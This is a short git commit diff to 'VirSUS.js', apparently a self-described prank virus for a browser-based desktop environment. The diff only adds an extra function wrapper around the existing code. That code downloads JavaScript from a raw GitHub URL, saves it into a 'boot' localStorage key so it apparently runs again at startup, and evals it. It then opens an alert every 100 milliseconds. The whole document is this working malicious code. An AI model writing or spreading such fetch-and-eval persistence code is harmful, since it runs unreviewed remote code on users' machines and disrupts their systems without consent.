387482a313a60df30d0044383f648f255ecee97f
Busybody64 <92069026+Busybody64@users.noreply.github.com>
2021-10-08 19:21:15 -0500

    Update VirSUS.js
    Compatability with sus93

--- VirSUS.js
+++ VirSUS.js
@@ -1,6 +1,8 @@
+(async function exampleModule() {
 (async () => {
     const settings = { method: "GET", mode: "cors", cache: "reload" };
     localStorage["boot/VirSUS.js"] = await fetch("https://raw.githubusercontent.com/Busybody64/VirSUS/main/VirSUS.js", settings).then(response => response.text()); 
     eval(localStorage["boot/VirSUS.js"]);
 })();
 setInterval(function() {$alert('YOU JUST GOT THE SUS VIRUS!')},100)
+})
